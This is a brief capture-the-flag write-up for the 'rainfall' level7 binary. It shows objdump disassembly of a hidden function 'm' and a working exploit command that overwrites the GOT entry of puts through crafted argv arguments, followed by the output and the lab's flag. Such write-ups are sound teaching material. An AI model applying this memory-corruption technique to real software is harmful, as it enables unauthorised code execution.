For the first time during rainfall, we have an executable with two args needed, in addition we can exploit `edx` register.

We use `objdump -d level7` and we find an uncalled function again named `m` :
```asm
080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret 
```

The goal here is to fill `argv[1]` with puts got address is `0x8049928` and fill `argv[2]` which represents `edx` with `080484f4` :
```bash
./level7 $(python -c "print '\x28\x99\x04\x08' * 6") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1638395898
```

A suspicious number appeared after the flag which represents the `%d` from `printf`.